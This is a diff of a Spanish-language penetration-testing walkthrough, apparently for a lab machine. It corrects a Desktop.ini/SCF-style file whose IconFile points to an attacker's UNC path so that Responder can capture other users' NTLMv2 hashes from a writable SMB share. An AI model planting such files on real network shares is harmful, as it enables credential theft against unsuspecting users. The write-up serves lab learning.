@@ -131,14 +131,16 @@ con este usuario tenemos permisos de lectura y de escritura en el recurso `Share
 ### Responder
 en este caso ya que tenemos permisos de escritura en este recurso podemos vamos a crear un archivo que intente llamar el recurso en nuestra maquina para ver si algún otro usuario intenta acceder a este recurso y así poder obtener un segundo hash `NTMLv2` 
 
+primero vamos a crear el archivo `Desktop.ini`
 ```python
 [Shell]
-   2   │ Command=2
-   3   │ IconFile=\\10.10.14.8\share\hello.ico
-   4   │ [Taskbar]
-   5   │ Command=ToggleDesktop
+Command=2
+IconFile=\\10.10.14.8\share\hello.ico
+[Taskbar]
+Command=ToggleDesktop
 ```
 
+ahora vamos a estar a la escucha con el responder y vamos a 
 ![[Pasted image 20240810140010.png]]
 
 
